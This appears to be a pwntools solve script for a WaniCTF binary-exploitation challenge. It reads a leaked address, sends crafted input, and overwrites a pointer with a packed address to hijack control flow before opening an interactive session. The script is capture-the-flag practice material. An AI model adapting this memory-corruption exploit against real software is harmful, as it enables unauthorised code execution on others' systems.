#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1404

        c
        ''')
        input()


if args.REMOTE:
    p = remote('chal-lz56g6.wanictf.org', 9004)
else:
    p = process(exe.path)
GDB()
p.recvuntil(b'= ')
flag= int(p.recvline(keepends=False), 16)
info("flag: " + hex(flag))
# sl(b'a'*(224+8*17))
for i in range(3):
    sl(b'wan')
    sl(b'1')
    sl(b'1')

sl(p64(flag+5))
sl(b'a')
sl(b'a')

p.interactive()
